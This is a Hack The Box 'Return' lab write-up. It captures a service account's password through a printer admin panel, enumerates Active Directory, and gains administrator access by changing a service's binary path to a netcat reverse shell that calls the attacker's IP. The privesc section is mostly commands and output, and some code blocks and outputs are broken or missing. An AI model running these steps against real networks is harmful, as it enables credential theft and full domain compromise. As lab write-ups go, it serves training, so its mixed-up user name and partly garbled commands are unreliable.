# Reconnaissance

First, i generated this template by using my script: [ch3ckkm8/Pentest-Auto-Report-](https://github.com/ch3ckkm8/Pentest-Auto-Report-)
```bash
python pentest_to_md.py 10.129.165.239 return.htb
```

## Add target to /etc/hosts

```bash
sudo sh -c "echo '10.129.165.239 return.htb' >> /etc/hosts"
```

## Nmap scan

```bash
sudo nmap -sC -sV return.htb
```

```bash

the target appears to be a DC according to the open ports

First, i will try inspecting port 80, which appears to be IIS server, and according to the http title its related to HTB Printer Admin Panel

### WebApp inspection

`Home` page:
![](MediaFiles/image%2012.png)

`Settings` page:
![](MediaFiles/image%201%201.png)

The rest of the pages Fax and Troubleshooting are not clickable.

Taking into consideration of the above screenshots, our target should be the `Settings` page, since appears to have some functionality by specifying server, port, user and password.

So where do we start with this? well it has some values already filled in, so understand their usage first. Overall it appears to be a webapp that manages a printer, and the settings page manages the authentication towards it. 

The password has asterisks instead of characters, and by viewing the page source the password is also displayed as asterisks there too:

![](MediaFiles/image%202%201.png)

Another thing we could do to see if we can retrieve the password, is to start Burp and inspect the request:
![](MediaFiles/image%203%201.png)

It seems that only the ip we specify is actually being sent towards the server-side via the request, and the rest of the values on the settings page are not being sent.

Hmm, the first thing that comes to mind, is the server address (since only that is being sent from the request), it seems that the printer listens on the server address and port we specify. 

---
# Foothold

### Connecting to the printer service

BUT since we can specify these details, why dont we try to make it connect to our machine? So we could try specifying the server address to our host’s ip, click update and see if we get connection back to our machine.

After updating, i started my listener, and since we dont know exactly the port, i will take for granted that the port is 389 as the preselected values on the settings page implied.
```bash
nc -lnvp 389
```

aand we got connection back!
```bash
listening on [any] 389 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.165.239] 64655
0*`%return\svc-printer�
                       1edFg43012!!
```

and the best part is that it just sent us sth that appears to be the password:
```bash
1edFg43012!!
```

great! now we have credentials for a valid user `svc-printer`, the creds for future reference are:
```bash
svc-printer
1edFg43012!!
```

## Checking where we can login with found creds

Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: [ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check](https://github.com/ch3ckkm8/auto_netexec)

```bash

```

```bash

it seems that with these creds, we can login only to `WINRM` and `LDAP`

```bash
evil-winrm -i return.htb -u 'svc-printer' -p '1edFg43012!!'
```

# Privesc

## LDAP enumeration

```bash
ldapsearch -LLL -x -H ldap://return.htb -s base namingcontexts
```

```bash
dn:
namingcontexts: DC=return,DC=local
namingcontexts: CN=Configuration,DC=return,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=return,DC=local
namingcontexts: DC=DomainDnsZones,DC=return,DC=local
namingcontexts: DC=ForestDnsZones,DC=return,DC=local
```

Lets find all available users in the domain, using ldapsearch with user creds:
```bash
ldapsearch -LLL -H ldap://return.htb \
  -D "svc-printer@return.local" -w '1edFg43012!!' \
  -b "DC=return,DC=local" "objectClass=user" |
  egrep -i ^sAMAccountName | awk -F ': ' '{print $2}' | tee users.txt
```

it was successful, and the retrieved user list is:
```bash
Administrator
Guest
PRINTER$
krbtgt
svc-printer
```

### Bloodhound as `SVC-PRINTER"`

Lets try also running bloodhound:
```bash
bloodhound-python -u 'svc-printer' -p '1edFg43012!!' -d return.local -ns 10.129.165.239 -c All --zip
```

First things first, we could inspect the user we already have access `SVC-PRINTER`:
![](MediaFiles/image%205%201.png)
it seems that user has no outbound object control

Lets also see its group membership:
![](MediaFiles/image%206%201.png)
hm the two that stand out here as non default, are `SERVER OPERATORS` and `PRINT OPERATORS` keep that in mind, we will revisit it later.

Inspecting the rest of the users:
![](MediaFiles/image%207%201.png)

thats strange, during our ldap enumeration, i found another user `Guest` that is not present here, lets search it manually on bloodhound:
![](MediaFiles/image%208%201.png)
it has no outbound object control

and the group membership is:
![](MediaFiles/image%209%201.png)

Now since the above did not indicate any obvious paths for privesc, i then run some of the bloodhound queries to see if i can get anything more there:
![](MediaFiles/image%2010%201.png)

Hmmm, we see here that we have `CanPSRemote` rights towards `PRINTER.RETURN.LOCAL` so we can login there, BUT what is this?

This icon on bloodhound, indicates that this is a windows host! 

And from this computer by gaining `SYSTEM` or `ADMIN RIGHTS` we have `DCSync` rights towards the domain!

So the path is clear here, we need to login to this windows host as `SVC-PRINTER` and thehmn escalate privileges to become `LOCAL ADMIN` ( `SYSTEM` or `ADMINISTRATOR`) locally and then `DCSync` towards the domain.

BUT how can we escalate privileges on that host? 

### Group Membership of user svc-printer

We could first check the privileges of our user (SVC-PRINTER)
```bash
whoami /priv
```

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Hm, now we must investigate which one from those privileges can lead to `local admin` escalation

After some research, i found that most probably the one to target should be the `SeBackupPrivilege` because it can be used to read any file (including SAM, SYSTEM, SECURITY hives).

Also lets see again the user’s details from the inside this time 
```bash
net user svc-printer
```

```bash
User name                    svc-printer
Full Name                    SVCPrinter

                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Before moving forward, lets find some information about these groups, (local group membership) because i have not seen them before and i dont see them frequently.

After some research, i found that `Server Operators` is a built-in privileged group 
designed to allow certain administrative actions **without granting full Domain Admin rights**.

## 🧰 **What Rights Do Server Operators Have?**

Members of the `Server Operators` group on a **domain controller** can:

| ✅ S**ervices**                  | They can modify services (can be used for persistence or privilege escalation).                                                        |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| ✅ **Back up and restore files** | Grants **`SeBackupPrivilege`** and **`SeRestorePrivilege`** — allows reading protected files like the **NTDS.dit**, SYSTEM hives, etc. |

What we found here was a connection between the privileges **`SeBackupPrivilege`** -**`SeRestorePrivilege`** and the `Server Operators` group! We must now find a way to abuse it.

Lets now check the ones that are relevant to our case below:

### Dumping NTDS.dit (**Back up and restore files)**

```bash
secretsdump.py 'return.local/svc-printer:1edFg43012!!'@10.129.165.43
```

[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter

```
it was not successful…

### **Services**

First lets list the services”

```bash

"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools

```

From all the services above, after searching them the one that stands out is VMware Guest Authentication Service (***VGAuthService***.exe) since this one handles user authentication between the host and the virtual machines. It appears to be associated with CVE-2022-22977

One common attack i found, was to change the binary path of the service, so we can make the service run a binary of our preference!

### Modifying and exploiting the service

1. First lets verify that we can write to the service’s directory:

```bash
icacls "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
```

```bash
C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe BUILTIN\Administrators:(F)Everyone:(RX)NT AUTHORITY\SYSTEM:(F)

Successfully processed 1 files; Failed processing 0 files
```
it seems that we can write to it!

1. modify the service, replace the binary with netcat

We will replace the binary with netcat, in order to get a rev shell back to our machine

first upload `nc.exe` from evil-winrm
```bash
upload /home/ch3ckm8/Downloads/nc.exe
```

2. modify the binary path, to point to netcat, and then tell netcat to connect to your machine’s ip
```bash
sc config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.3 443"
sc stop VGAuthService
sc start VGAuthService
```

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.3 443"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VGAuthService

SERVICE_NAME: VGAuthService
        TYPE               : 10  WIN32_OWN_PROCESS

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VGAuthService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
Don’t worry about this error “The service did not respond to the start or control request in a timely fashion.” , it is expected

3. Start the listener:
```bash
 rlwrap nc -nlvp 443
```

aand got shell!
```bash

# Summary

Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

#### Reconnaissance
1. nmap `scan` -> https stands out, tried this one first
2. inspected the `web app` which appeared to be related with some printer service, and by using BurpSuite found that one page (settings) only sends the `ip` address from the form, while also containing valuable information such as a valid username (svc-printer)
#### Foothold
1. since it only sends the ip that the user specifies on the form, i tried typing my hosts ip and successfully grabbed `rev shell`, which also gave out a plaintext password!
2. `correlated` the found user's  creds with the `win-rm` and `ldap` service
3. **logged in** via evil-winrm to host using on user **svc-alfresco**, and grabbed the ==user flag==.
#### Privesc
1. enumerated `LDAP` via ldapsearch and bloodhound, found found valid users and also that the compromised user's `group membership` was among other default ones, some groups called `Server Operators` and `Print Operators` .
2. Inspected both of these groups, and i found that `Server Operators` have some interesting privileges that allow to backup/restore specific files and even `modify services`
3. Then i `listed services` and found one service (VGAuthService) to be vulnerable to a cve, for which i found commands that exploit it via modifying the service's binary and replacing it with a binary of our preference, which in that case was netcat exe (nc.exe) in order to get a shell back on our machine
4. after restarting the service, `netcat` connected to our machine, `got shell` as administrator and grab the ==root flag==

---

# Sidenotes

This was an interesting machine, lesson learned from this one was to thoroughly analyze and identify user group membership’s privileges. Though bloodhound usage at first showed the overall privesc path , smaller details had to be found by analyzing and investigating what the groups are allowed to do in terms of privileges.
